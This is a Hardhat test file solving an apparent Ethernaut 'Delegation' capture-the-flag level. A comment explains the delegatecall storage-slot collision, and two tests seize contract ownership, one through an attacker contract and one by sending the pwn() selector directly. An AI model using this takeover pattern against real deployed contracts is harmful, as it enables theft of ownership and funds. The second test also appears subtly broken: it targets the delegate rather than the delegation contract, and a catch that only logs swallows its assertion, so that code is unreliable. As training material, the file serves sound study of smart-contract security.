const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██████╗░███████╗██╗░░░░░███████╗░██████╗░░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██║░░██║█████╗░░██║░░░░░█████╗░░██║░░██╗░███████║░░░██║░░░██║██║░░██║██╔██╗██║
██║░░██║██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██║░░░██║░░░██║██║░░██║██║╚████║
██████╔╝███████╗███████╗███████╗╚██████╔╝██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚═════╝░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝
 
 * Goal: 
 * 
 * 1. Claim ownership of the contract Delegation
 * 
 * Solution:
 *
 * The advantage of delegatecall() is that you can preserve your current, 
 * calling contract’s context. This context includes its storage and its 
 * msg.sender, msg.value attributes.
 * When contract A makes a delegatecall to Contract B, it allows Contract B 
 * to freely mutate its storage A.
 * The solution is to exploit the storage of both the Delegation and Delegate 
 * contracts, which both have the owner variable in slot 0. 
 * By calling with delegatecall the pwn() function of the Delegate contract, 
 * we are replacing the owner with the caller's address.
 * Below are the attack via a smart contract or via directly sending a 
 * transaction with given the signature of the public pwn function.
 * 
 * Note:
 * 
 * Quick Note on Storage: Ethereum stores data in storage “slots”, which are 
 * these 32 byte sized slots. Every time you save a variable to storage, it 
 * automatically occupies the remaining space in the current slot, or the 
 * next slot in sequence.
 * 
 */
describe("Delegation", function () {
    let delegate, delegation, delegationAttacker, owner, player;

    before(async function () {
        [owner, player] = await ethers.getSigners();
    });

    describe("Attack (with smart contract)", async function () {
        before(async function () {
            const Delegate = await ethers.getContractFactory("contracts/Delegation/Delegate.sol:Delegate");
            delegate = await Delegate.connect(owner).deploy(owner.address);

            const Delegation = await ethers.getContractFactory("contracts/Delegation/Delegation.sol:Delegation");
            delegation = await Delegation.connect(owner).deploy(delegate.address);

            // player deploy the attacker smart contract
            const DelegationAttacker = await ethers.getContractFactory("contracts/Delegation/DelegationAttacker.sol:DelegationAttacker");
            delegationAttacker = await DelegationAttacker.connect(player).deploy(delegation.address);
        });

        it("Should steal the Delegation ownership", async function () {
            expect(await delegation.connect(player).owner()).to.be.eq(owner.address);

            await delegationAttacker.connect(player).stealOwnership();

            expect(await delegation.connect(player).owner()).to.be.eq(delegationAttacker.address);
        });
    });

    describe("Attack (without smart contract)", async function () {
        before(async function () {
            const Delegate = await ethers.getContractFactory("contracts/Delegation/Delegate.sol:Delegate");
            delegate = await Delegate.connect(owner).deploy(owner.address);

            const Delegation = await ethers.getContractFactory("contracts/Delegation/Delegation.sol:Delegation");
            delegation = await Delegation.connect(owner).deploy(delegate.address);
        });

        // TODO: review
        it("Should steal the Delegation ownership", async function () {
            expect(await delegation.connect(player).owner()).to.be.eq(owner.address);

            let interface = new ethers.utils.Interface(["function pwn()"]);
            const signaturePwn = interface.encodeFunctionData("pwn()");

            await player
                .sendTransaction({
                    to: delegate.address,
                    data: signaturePwn,
                })
                .then(async (tx) => {
                    const receipt = await tx.wait();
                    console.log(receipt);
                    expect(await delegation.connect(player).owner()).to.be.eq(player.address); // now player is the new owner
                }).catch(console.log);

        });
    });
});
